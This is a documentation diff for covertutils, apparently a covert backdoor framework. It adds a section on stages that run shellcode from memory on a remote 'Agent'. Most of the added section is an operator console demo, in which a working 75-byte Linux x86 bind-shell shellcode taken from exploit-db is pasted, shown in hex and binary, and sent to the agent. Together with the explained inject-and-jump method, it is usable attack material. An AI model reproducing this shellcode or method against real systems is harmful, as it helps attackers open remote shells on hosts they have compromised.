@@ -11,8 +11,8 @@ Some stages are demonstrarted in this page.
 
 .. _pythonapi-stage:
 
-The Python Stage
-----------------
+The `Python` Stage
+------------------
 
 A Python shell with access to all internals is available.
 
@@ -70,3 +70,95 @@ so it is able to access the ``storage`` and ``storage['COMMON']`` dictionaries a
 
 	[python] >>>
 	(127.0.0.1:49550)>
+
+
+
+
+
+
+The `Shellcode` Stages
+----------------------
+
+When one can directly run stuff in a process, why not run some `shellcode` too?
+
+And do it **directly from memory** please!
+
+Runnning `shellcode` requires the following things:
+
+ - Acquiring the shellcode!
+ - Copying it to memory, to a known memory location
+ - Making that location executable at runtime
+ - ``jmp`` ing to that location
+
+So `covertutils` has 2 `stages` that utilize ``ctypes`` built-in package to do the right things and finally run `shellcode`!
+They are located under :mod:`covertutils.payloads.linux.shellcode` and :mod:`covertutils.payloads.windows.shellcode`.
+
+A `SubShell` is also available that translates copy-pasted `shellcodes` from various sources to raw data, before sending them over to a poor `Agent`.
+
+
+.. code:: bash
+
+	(127.0.0.1:51038)> !stage mload covertutils.payloads.linux.shellcode
+	 shellcode
+
+	(127.0.0.1:51038)>
+	Available Streams:
+		[ 0] - control
+		[ 1] - python
+		[ 2] - os-shell
+		[ 3] - shellcode
+		[ 4] - stage
+		[99] - EXIT
+	Select stream: 3
+	This shell will properly format shellcode
+		pasted from sources like "exploit-db.com" and "msfvenom"
+	[shellcode]>
+	[shellcode]>
+	[shellcode]> unsigned char code[]= \
+
+	Type 'GO' when done pasting...
+	[shellcode]> "\x6a\x66\x58\x99\x53\x43\x53\x6a\x02\x89\xe1\xcd\x80\x5b\x5e\x52"
+
+	Type 'GO' when done pasting...
+	[shellcode]> "\x66\x68\x11\x5c\x52\x6a\x02\x6a\x10\x51\x50\x89\xe1\xb0\x66\xcd"
+
+	Type 'GO' when done pasting...
+	[shellcode]> "\x80\x89\x41\x04\xb3\x04\xb0\x66\xcd\x80\x43\xb0\x66\xcd\x80\x93"
+
+	Type 'GO' when done pasting...
+	[shellcode]> "\x59\xb0\x3f\xcd\x80\x49\x79\xf9\x68\x2f\x2f\x73\x68\x68\x2f\x62"
+
+	Type 'GO' when done pasting...
+	[shellcode]> "\x69\x6e\x89\xe3\x50\x89\xe1\xb0\x0b\xcd\x80";
+
+	Type 'GO' when done pasting...
+	[shellcode]>
+	[shellcode]> GO
+
+	Type 'GO' when done pasting...
+	====================
+	Pasted lines:
+	unsigned char code[]= \
+	"\x6a\x66\x58\x99\x53\x43\x53\x6a\x02\x89\xe1\xcd\x80\x5b\x5e\x52"
+	"\x66\x68\x11\x5c\x52\x6a\x02\x6a\x10\x51\x50\x89\xe1\xb0\x66\xcd"
+	"\x80\x89\x41\x04\xb3\x04\xb0\x66\xcd\x80\x43\xb0\x66\xcd\x80\x93"
+	"\x59\xb0\x3f\xcd\x80\x49\x79\xf9\x68\x2f\x2f\x73\x68\x68\x2f\x62"
+	"\x69\x6e\x89\xe3\x50\x89\xe1\xb0\x0b\xcd\x80";
+
+
+	Length of 75 bytes
+
+	Shellcode in HEX :
+	6a6658995343536a0289e1cd805b5e526668115c526a026a10515089e1b066cd80894104b304b066cd8043b066cd809359b03fcd804979f9682f2f7368682f62696e89e35089e1b00bcd80
+
+	Shellcode in BINARY :
+	jfX�SCSj��̀[^Rfh\RjjQP���f̀�A��f̀C�f̀�Y�?̀Iy�h//shh/bin��P���
+
+	====================
+	Send the shellcode over? [y/N] y
+	[shellcode]>
+
+* The `shellcode` used in the demo is taken from https://www.exploit-db.com/exploits/42254/
+
+
+Oh, and on more thing! `Shellcodes` do no need to be `Null Free` (of course!). The string termination is on Python.
